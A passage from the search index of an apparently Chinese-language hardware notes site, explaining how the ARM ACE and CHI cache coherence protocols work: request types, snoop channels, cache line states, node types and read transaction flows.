\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u901a\u77e5\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u4e0d\u200b\u901a\u77e5\u200b\u4e0b\u200b\u4e00\u7ea7\u200b\u3002</li> <li>\u200b\u6536\u5230\u200b snoop \u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8fd4\u56de\u200b\u5f53\u524d\u200b\u7684\u200b\u7f13\u5b58\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u66f4\u65b0\u200b\u72b6\u6001\u200b\u3002</li> <li>\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u65b9\u6cd5\u200b\u6765\u200b\u901a\u77e5\u200b\u4e0b\u200b\u4e00\u7ea7\u200b Cache/Interconnect\uff0c\u200b\u544a\u8bc9\u200b\u5b83\u200b\u7b2c\u4e00\u200b\u548c\u200b\u7b2c\u4e8c\u6b65\u200b\u5b8c\u6210\u200b\u4e86\u200b\u3002</li> </ol> <p>\u200b\u9996\u5148\u200b\u8003\u8651\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u7b2c\u4e00\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u8bfb\u200b\u6216\u200b\u5199\u200b miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8bf7\u6c42\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u66f4\u65b0\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b\u8bfb\u53d6\u200b\u5230\u200b Shared\uff0c\u200b\u5199\u5165\u200b\u5230\u200b Modified \u200b\u7b49\u200b\u3002</p> <p>AXI \u200b\u5df2\u7ecf\u200b\u6709\u200b AR \u200b\u548c\u200b R channel \u200b\u7528\u4e8e\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9047\u5230\u200b\u8bfb\u200b\u6216\u8005\u200b\u5199\u200b miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b AR channel \u200b\u4e0a\u200b\u634e\u5e26\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u8ba9\u200b\u4e0b\u200b\u4e00\u7ea7\u200b\u7684\u200b Interconnect \u200b\u77e5\u9053\u200b\u81ea\u5df1\u200b\u7684\u200b\u610f\u56fe\u200b\u662f\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b\uff0c\u200b\u7136\u540e\u200b Interconnect \u200b\u5c31\u200b\u5728\u200b R channel \u200b\u4e0a\u200b\u8fd4\u56de\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5177\u4f53\u200b\u8981\u200b\u634e\u5e26\u200b\u4ec0\u4e48\u200b\u4fe1\u606f\u200b\u5462\u200b\uff1f\u201c\u200b\u4e0d\u59a8\u200b\u201d\u200b\u7528\u200b\u8fd9\u6837\u200b\u4e00\u79cd\u200b\u547d\u540d\u200b\u65b9\u5f0f\u200b\uff1a<code>\u200b\u64cd\u4f5c\u200b + \u200b\u76ee\u7684\u200b\u72b6\u6001\u200b</code>\uff0c\u200b\u6bd4\u5982\u200b\u8bfb\u200b miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u53eb\u200b ReadShared\uff1b\u200b\u5199\u200b miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff08\u200b\u901a\u5e38\u200b\u5199\u5165\u200b\u7f13\u5b58\u200b\u7684\u200b\u53ea\u662f\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5148\u8981\u200b\u628a\u200b\u5b8c\u6574\u200b\u7684\u200b\u8bfb\u200b\u8fdb\u6765\u200b\uff09\uff0c\u200b\u5c31\u200b\u53eb\u200b ReadUnique\u3002\u200b\u8fd9\u4e2a\u200b\u64cd\u4f5c\u200b\u53ef\u4ee5\u200b\u7f16\u7801\u200b\u5230\u200b\u4e00\u4e2a\u200b\u4fe1\u53f7\u200b\u4e2d\u200b\uff0c\u200b\u4f20\u9012\u200b\u7ed9\u200b Interconnect\u3002</p> <p>\u200b\u518d\u200b\u6765\u200b\u8003\u8651\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u7b2c\u4e8c\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b valid &amp;&amp; !dirty \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u5347\u7ea7\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4ece\u200b Shared \u200b\u5230\u200b Modified\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u9700\u8981\u200b\u8ba9\u200b Interconnect \u200b\u628a\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u6570\u636e\u200b\u6e05\u7a7a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u628a\u200b\u81ea\u5df1\u200b\u5347\u7ea7\u200b\u5230\u200b Unique\u3002\u200b\u6839\u636e\u200b\u4e0a\u9762\u200b\u7684\u200b <code>\u200b\u64cd\u4f5c\u200b + \u200b\u76ee\u7684\u200b\u72b6\u6001\u200b</code> \u200b\u7684\u200b\u547d\u540d\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bb2\u200b\u5176\u200b\u547d\u540d\u200b\u4e3a\u200b CleanUnique\uff0c\u200b\u5373\u200b\u628a\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b Clean \u200b\u6389\u200b\uff0c\u200b\u7136\u540e\u200b\u81ea\u5df1\u200b\u53d8\u6210\u200b Unique\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u8003\u8651\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u7b2c\u4e09\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u9700\u8981\u200b evict \u200b\u4e00\u4e2a\u200b valid &amp;&amp; dirty \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u628a\u200b dirty \u200b\u6570\u636e\u200b\u5199\u56de\u200b\uff0c\u200b\u5e76\u4e14\u200b\u964d\u7ea7\u200b\u81ea\u5df1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6bd4\u5982\u200b Modified -&gt; Shared/Invalid\u3002</p> <p>\u200b\u6309\u7167\u200b\u524d\u9762\u200b\u7684\u200b <code>\u200b\u64cd\u4f5c\u200b + \u200b\u76ee\u7684\u200b\u72b6\u6001\u200b</code> \u200b\u547d\u540d\u200b\u6cd5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u547d\u540d\u200b\u4e3a\u200b WriteBackInvalid\u3002ACE \u200b\u5b9e\u9645\u200b\u91c7\u7528\u200b\u7684\u200b\u547d\u540d\u200b\u662f\u200b WriteBack\u3002</p> <p>\u200b\u7b2c\u56db\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u6536\u5230\u200b snoop \u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u8fd4\u56de\u200b\u5f53\u524d\u200b\u7684\u200b\u7f13\u5b58\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u66f4\u65b0\u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u65e2\u7136\u200b snoop \u200b\u662f\u4ece\u200b Interconnect \u200b\u53d1\u7ed9\u200b Master\uff0c\u200b\u5728\u200b\u5df2\u6709\u200b\u7684\u200b AR R AW W B channel \u200b\u91cc\u200b\u6ca1\u200b\u529e\u6cd5\u200b\u505a\u200b\u8fd9\u4e2a\u200b\u4e8b\u60c5\u200b\uff0c\u200b\u4e0d\u7136\u200b\u4f1a\u200b\u6253\u7834\u200b\u5df2\u6709\u200b\u7684\u200b\u903b\u8f91\u200b\u3002\u200b\u90a3\u200b\u4e0d\u5f97\u4e0d\u200b\u6dfb\u52a0\u200b\u4e00\u5bf9\u200b channel\uff1a\u200b\u89c4\u5b9a\u200b\u4e00\u4e2a\u200b AC channel \u200b\u7531\u200b Interconnect \u200b\u53d1\u9001\u200b snoop \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u4e00\u4e2a\u200b C channel \u200b\u8ba9\u200b Master \u200b\u53d1\u9001\u200b\u54cd\u5e94\u200b\u3002\u200b\u8fd9\u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b TileLink \u200b\u91cc\u9762\u200b\u7684\u200b B channel\uff08Probe \u200b\u8bf7\u6c42\u200b\uff09\u200b\u548c\u200b C channel\uff08ProbeAck \u200b\u54cd\u5e94\u200b\uff09\u3002\u200b\u5b9e\u9645\u200b ACE \u200b\u548c\u200b\u521a\u624d\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u5b9e\u9645\u200b\u6709\u200b\u4e00\u4e9b\u200b\u533a\u522b\u200b\uff0c\u200b\u628a\u200b C channel \u200b\u62c6\u6210\u200b\u4e86\u200b\u4e24\u4e2a\u200b\uff1aCR \u200b\u7528\u4e8e\u200b\u8fd4\u56de\u200b\u6240\u6709\u200b\u54cd\u5e94\u200b\uff0cCD \u200b\u7528\u4e8e\u200b\u8fd4\u56de\u200b\u90a3\u4e9b\u200b\u9700\u8981\u200b\u6570\u636e\u200b\u7684\u200b\u54cd\u5e94\u200b\u3002\u200b\u8fd9\u200b\u5c31\u200b\u50cf\u200b AW \u200b\u548c\u200b W \u200b\u7684\u200b\u5173\u7cfb\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u4f20\u200b\u5730\u5740\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u4f20\u200b\u6570\u636e\u200b\uff1b\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0cCR \u200b\u4f20\u200b\u72b6\u6001\u200b\uff0cCD \u200b\u4f20\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b AC channel \u200b\u4e0a\u8981\u200b\u53d1\u9001\u200b\u4ec0\u4e48\u200b\u8bf7\u6c42\u200b\u5462\u200b\uff1f\u200b\u56de\u987e\u200b\u4e00\u4e0b\u200b\u4e0a\u9762\u200b\u5df2\u7ecf\u200b\u7528\u5230\u200b\u7684\u200b\u8bf7\u6c42\u200b\u7c7b\u578b\u200b\uff1a\u200b\u9700\u8981\u200b snoop \u200b\u7684\u200b\u6709\u200b ReadShared\uff0cReadUnique \u200b\u548c\u200b CleanUnique\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b snoop \u200b\u7684\u200b\u6709\u200b WriteBack\u3002\u200b\u90a3\u4e48\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b AC channel \u200b\u628a\u200b ReadShared\uff0cReadUnique \u200b\u548c\u200b CleanUnique \u200b\u8fd9\u200b\u4e09\u79cd\u200b\u8bf7\u6c42\u200b\u539f\u6837\u200b\u53d1\u9001\u7ed9\u200b\u9700\u8981\u200b snoop \u200b\u7684\u200b Cache \u200b\u5373\u53ef\u200b\u3002Cache \u200b\u5728\u200b AC channel \u200b\u6536\u5230\u200b\u8fd9\u4e9b\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u518d\u200b\u505a\u200b\u76f8\u5e94\u200b\u7684\u200b\u52a8\u4f5c\u200b\u3002</p> <p>\u200b\u7b2c\u4e94\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u65b9\u6cd5\u200b\u6765\u200b\u901a\u77e5\u200b\u4e0b\u200b\u4e00\u7ea7\u200b Cache/Interconnect\uff0c\u200b\u544a\u8bc9\u200b\u5b83\u200b\u7b2c\u4e00\u200b\u548c\u200b\u7b2c\u4e8c\u6b65\u200b\u5b8c\u6210\u200b\u4e86\u200b\u3002TileLink \u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u989d\u5916\u200b\u7684\u200b E channel \u200b\u6765\u200b\u505a\u200b\u8fd9\u4e2a\u200b\u4e8b\u60c5\u200b\uff0cACE \u200b\u66f4\u52a0\u200b\u7c97\u66b4\u200b\uff1a\u200b\u76f4\u63a5\u200b\u7528\u200b\u4e00\u5bf9\u200b RACK \u200b\u548c\u200b WACK \u200b\u4fe1\u53f7\u200b\u6765\u200b\u5206\u522b\u200b\u8868\u793a\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u5df2\u7ecf\u200b\u5b8c\u6210\u200b\u3002\u200b\u5173\u4e8e\u200b WACK \u200b\u548c\u200b RACK \u200b\u7684\u200b\u8ba8\u8bba\u200b\uff0c\u200b\u8be6\u89c1\u200b What's the purpose for WACK and RACK for ACE and what's the relationship with WVALID and RVALID? \u3002</p> <p>\u200b\u8fd9\u65f6\u5019\u200b\u5df2\u7ecf\u200b\u57fa\u672c\u200b\u628a\u200b ACE \u200b\u534f\u8bae\u200b\u7684\u200b\u4fe1\u53f7\u200b\u548c\u200b\u5927\u4f53\u200b\u7684\u200b\u5de5\u4f5c\u200b\u6d41\u7a0b\u200b\u63a8\u5bfc\u200b\u51fa\u6765\u200b\u4e86\u200b\u3002\u200b\u4ece\u200b\u4fe1\u53f7\u200b\u4e0a\u200b\u6765\u770b\u200b\uff0cACE \u200b\u534f\u8bae\u200b\u5728\u200b AXI \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4e09\u4e2a\u200b channel\uff1a</p> <ol> <li>AC: Coherent address channel, Input to master: ACADDR, ACSNOOP, ACPROT</li> <li>CR: Coherent response channel, Output from master: CRRESP</li> <li>CD: Coherent data channel, Output from master: CDDATA, CDLAST</li> </ol> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5df2\u6709\u200b\u7684\u200b Channel \u200b\u4e5f\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4fe1\u53f7\u200b\uff1a</p> <ol> <li>ARSNOOP[3:0]/ARBAR[1:0]/ARDOMAIN[1:0]</li> <li>AWSNOOP[3:0]/AWBAR[1:0]/AWDOMAIN[1:0]/AWUNIQUE</li> <li>RRESP[3:2]</li> <li>RACK/WACK</li> </ol> <p>ACE \u200b\u534f\u8bae\u200b\u8fd8\u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u4e00\u4e2a\u200b ACE-Lite \u200b\u7248\u672c\u200b\uff1aACE-Lite \u200b\u53ea\u200b\u5728\u200b\u5df2\u6709\u200b Channel \u200b\u4e0a\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u65b0\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u6ca1\u6709\u200b\u6dfb\u52a0\u200b\u65b0\u200b\u7684\u200b Channel\u3002\u200b\u56e0\u6b64\u200b\u5b83\u200b\u5185\u90e8\u200b\u4e0d\u80fd\u200b\u6709\u200b Cache\uff0c\u200b\u4f46\u662f\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u4e00\u81f4\u200b\u7684\u200b\u7f13\u5b58\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#chi","title":"CHI \u200b\u534f\u8bae","text":""},{"location":"hardware/cache_coherence_protocol.html#_5","title":"\u4ecb\u7ecd","text":"<p>CHI \u200b\u534f\u8bae\u200b\u662f\u200b AMBA 5 \u200b\u6807\u51c6\u200b\u4e2d\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\uff0c\u200b\u524d\u8eab\u200b\u662f\u200b ACE \u200b\u534f\u8bae\u200b\u3002\u200b\u6700\u65b0\u200b\u7684\u200b CHI \u200b\u6807\u51c6\u200b\u53ef\u4ee5\u200b\u4ece\u200b AMBA 5 CHI Architecture Specification \u200b\u5904\u200b\u4e0b\u8f7d\u200b\u3002</p> <p>\u200b\u76f8\u6bd4\u200b AXI\uff0cCHI \u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\uff0c\u200b\u8fdb\u884c\u200b\u4e86\u200b\u5206\u5c42\u200b\uff1a\u200b\u534f\u8bae\u200b\u5c42\u200b\uff0c\u200b\u7269\u7406\u5c42\u200b\u548c\u200b\u94fe\u8def\u5c42\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0cCHI \u200b\u9002\u7528\u200b\u4e8e\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u652f\u6301\u200b\u6839\u636e\u200b Node ID \u200b\u8fdb\u884c\u200b\u8def\u7531\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u50cf\u200b AXI \u200b\u90a3\u6837\u200b\u53ea\u200b\u6309\u7167\u200b\u7269\u7406\u5730\u5740\u200b\u8fdb\u884c\u200b\u8def\u7531\u200b\u3002CHI \u200b\u7684\u200b\u5730\u4f4d\u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b Intel \u200b\u7684\u200b\u73af\u5f62\u200b\u603b\u7ebf\u200b\u3002CHI \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6865\u200b\u63a5\u5230\u200b CCIX \u200b\u4e0a\u200b\uff0c\u200b\u7528\u200b CCIX \u200b\u8fde\u63a5\u200b SMP \u200b\u7684\u200b\u7684\u200b\u591a\u4e2a\u200b Socket\uff0c\u200b\u6216\u8005\u200b\u8fde\u63a5\u200b\u652f\u6301\u200b CCIX \u200b\u7684\u200b\u663e\u5361\u200b\u7b49\u7b49\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#_6","title":"\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001","text":"<p>\u200b\u9996\u5148\u200b\u56de\u987e\u200b ACE \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\uff0c\u200b\u5171\u6709\u200b\u4e94\u79cd\u200b\uff0c\u200b\u4e0e\u200b MOESI \u200b\u76f8\u5bf9\u200b\u5e94\u200b\uff1a</p> <ol> <li>UniqueDirty: Modified</li> <li>SharedDirty: Owned</li> <li>UniqueClean: Exclusive</li> <li>SharedClean: Shared</li> <li>Invalid: Invalid</li> </ol> <p>\u200b\u5728\u200b\u6b64\u57fa\u7840\u200b\u4e0a\u200b\uff0cCHI \u200b\u8003\u8651\u200b\u7f13\u5b58\u200b\u884c\u200b\u53ea\u6709\u200b\u90e8\u5206\u200b\u5b57\u8282\u200b\u6709\u6548\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5373\u200b Full\uff0cPartial \u200b\u6216\u8005\u200b Empty\u3002\u200b\u56e0\u6b64\u200b CHI \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\u5171\u6709\u200b\u4e03\u79cd\u200b\uff1a</p> <ol> <li>UniqueDirty: Modified</li> <li>UniqueDirtyPartial: \u200b\u65b0\u589e\u200b\uff0c\u200b\u53ef\u80fd\u200b\u6709\u200b\u90e8\u5206\u200b\u5b57\u8282\u200b\u5408\u6cd5\u200b\uff0c\u200b\u5728\u200b\u5199\u200b\u56de\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u548c\u200b\u4e0b\u200b\u4e00\u7ea7\u200b\u7f13\u5b58\u200b\u6216\u8005\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u5408\u6cd5\u200b\u7f13\u5b58\u200b\u884c\u200b\u5185\u5bb9\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b</li> <li>SharedDirty: Owned</li> <li>UniqueClean: Exclusive</li> <li>UniqueCleanEmpty: \u200b\u65b0\u589e\u200b\uff0c\u200b\u6240\u6709\u200b\u5b57\u8282\u200b\u90fd\u200b\u4e0d\u200b\u5408\u6cd5\u200b\uff0c\u200b\u4f46\u662f\u200b\u672c\u200b\u7f13\u5b58\u200b\u5360\u6709\u200b\u8be5\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u4fee\u6539\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u901a\u77e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b</li> <li>SharedClean: Shared</li> <li>Invalid: Invalid</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\u7684\u200b\u5c31\u662f\u200b UniqueDirtyPartial \u200b\u548c\u200b UniqueCleanEmpty\u3002CHI \u200b\u6807\u51c6\u200b\u5728\u200b 4.1.1 \u200b\u7ae0\u8282\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\uff1a\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b CPU \u200b\u5373\u5c06\u200b\u8981\u200b\u5199\u5165\u200b\u4e00\u7247\u200b\u5185\u5b58\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u5148\u200b\u8f6c\u6362\u200b\u5230\u200b UniqueCleanEmpty \u200b\u72b6\u6001\u200b\u4e2d\u200b\uff0c\u200b\u628a\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u90fd\u200b\u6e05\u7a7a\u200b\uff0c\u200b\u8fd9\u6837\u200b\u540e\u7eed\u200b\u5199\u5165\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u8be2\u95ee\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\uff0c\u200b\u6027\u80fd\u200b\u6bd4\u8f83\u200b\u597d\u200b\u3002\u200b\u4f46\u200b\u6b64\u65f6\u200b\u56e0\u4e3a\u200b\u6570\u636e\u200b\u8fd8\u200b\u6ca1\u200b\u5199\u8fdb\u53bb\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5c31\u662f\u200b Empty\uff0c\u200b\u53ea\u200b\u66f4\u65b0\u200b\u72b6\u6001\u200b\uff0c\u200b\u4e0d\u200b\u5360\u7528\u200b\u7f13\u5b58\u200b\u7684\u200b\u7a7a\u95f4\u200b\u3002\u200b\u53e6\u4e00\u65b9\u9762\u200b\uff0c\u200b\u5982\u679c\u200b CPU \u200b\u53ea\u200b\u5199\u200b\u4e86\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\u5b57\u8282\u200b\uff0c\u200b\u5176\u4ed6\u200b\u90e8\u5206\u200b\u6ca1\u6709\u200b\u78b0\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5f15\u5165\u200b UniqueDirtyPartial \u200b\u4ee5\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b\u5408\u5e76\u200b\u65b0\u65e7\u200b\u7f13\u5b58\u200b\u884c\u200b\u6570\u636e\u200b\u8fd9\u200b\u4e00\u6b65\u200b\uff0c\u200b\u4e0b\u200b\u653e\u5230\u200b\u6bd4\u8f83\u200b\u9760\u8fd1\u200b\u5185\u5b58\u200b\u7684\u200b\u5c42\u7ea7\u200b\u4e0a\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4e86\u200b\u6570\u636e\u200b\u642c\u8fd0\u200b\u7684\u200b\u6b21\u6570\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#chi_1","title":"CHI \u200b\u7f51\u7edc\u200b\u8282\u70b9","text":"<p>CHI \u200b\u7684\u200b\u8282\u70b9\u200b\u7ec4\u7ec7\u200b\u6210\u200b\u4e00\u4e2a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u662f\u200b\u7247\u95f4\u200b\u7684\u200b\u8fde\u63a5\u200b\u3002CHI \u200b\u7684\u200b\u8282\u70b9\u200b\u5206\u6210\u200b\u4e09\u79cd\u200b\u7c7b\u578b\u200b\uff1a</p> <ol> <li>Request Node\uff1a\u200b\u53d1\u8d77\u200b CHI \u200b\u8bf7\u6c42\u200b\u7684\u200b\u8282\u70b9\u200b\uff0c\u200b\u5bf9\u5e94\u200b CPU \u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u6216\u8005\u200b\u662f\u200b\u7f51\u5361\u200b\u7b49\u200b\u5916\u8bbe\u200b</li> <li>Home Node\uff1a\u200b\u7ba1\u7406\u200b Request Node \u200b\u6765\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u6700\u540e\u200b\u4e00\u7ea7\u200b\u7f13\u5b58\u200b</li> <li>Subordinate Node\uff1a\u200b\u5904\u7406\u200b Home Node \u200b\u6765\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u5185\u5b58\u200b\u6216\u8005\u200b\u663e\u5b58\u200b\u7b49\u200b\u6709\u200b\u5185\u5b58\u200b\u7684\u200b\u5916\u8bbe\u200b</li> </ol> <p>\u200b\u5728\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u4e0b\u200b\uff0cNode \u200b\u4e4b\u95f4\u200b\u53ef\u4ee5\u200b\u4e92\u76f8\u200b\u901a\u4fe1\u200b\uff0c\u200b\u56e0\u6b64\u200b\u65b9\u4fbf\u200b\u505a\u200b\u4e00\u4e9b\u200b\u65b0\u200b\u7684\u200b\u4f18\u5316\u200b\u3002\u200b\u4f8b\u5982\u200b\u4f20\u7edf\u200b\u7684\u200b\u7f13\u5b58\u200b\u5c42\u6b21\u200b\u91cc\u200b\uff0c\u200b\u8bf7\u6c42\u200b\u662f\u200b\u4e00\u7ea7\u200b\u4e00\u7ea7\u200b\u4e0b\u53bb\u200b\uff0c\u200b\u54cd\u5e94\u200b\u518d\u200b\u4e00\u7ea7\u200b\u4e00\u7ea7\u200b\u4e0a\u6765\u200b\u3002\u200b\u4f46\u662f\u200b CHI \u200b\u53ef\u80fd\u200b\u662f\u200b Request Node \u200b\u53d1\u7ed9\u200b Home Node \u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u54cd\u5e94\u200b\u76f4\u63a5\u200b\u7531\u200b Subordinate Node \u200b\u53d1\u9001\u200b\u56de\u200b Request Node \u200b\u4e86\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#_7","title":"\u8bfb\u200b\u8bf7\u6c42","text":"<p>CHI \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u590d\u6742\u6027\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u5e26\u6765\u200b\u4e86\u200b\u5f88\u591a\u200b\u7684\u200b\u7075\u6d3b\u6027\u200b\uff0c\u200b\u4e5f\u200b\u610f\u5473\u7740\u200b\u6f5c\u5728\u200b\u7684\u200b\u6027\u80fd\u200b\u4f18\u5316\u200b\u7684\u200b\u53ef\u80fd\u200b\u3002\u200b\u4f8b\u5982\u200b\u5728\u200b CHI \u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ef\u80fd\u200b\u6709\u200b\u5f88\u200b\u591a\u79cd\u200b\u8fc7\u7a0b\u200b\uff08CHI \u200b\u6807\u51c6\u200b\u7b2c\u200b 2.3.1 \u200b\u7ae0\u8282\u200b\uff09\uff1a</p> <p>\u200b\u7b2c\u4e00\u79cd\u200b\u662f\u200b Home Node \u200b\u76f4\u63a5\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u6570\u636e\u200b\uff08Combined response from home\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    Requester-&gt;&gt;Home: Read*\n    Home-&gt;&gt;Requester: CompData\n    Requester-&gt;&gt;Home: CompAck</code></pre> <p>\u200b\u7b2c\u4e8c\u79cd\u200b\u662f\u200b Home Node \u200b\u628a\u200b\u54cd\u5e94\u200b\u62c6\u6210\u200b\u4e24\u4efd\u200b\uff0c\u200b\u4e00\u4efd\u200b\u8868\u793a\u200b\u8bfb\u53d6\u200b\u7ed3\u679c\u200b\uff0c\u200b\u4e00\u4efd\u200b\u643a\u5e26\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff08Separate data and response from Home\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant 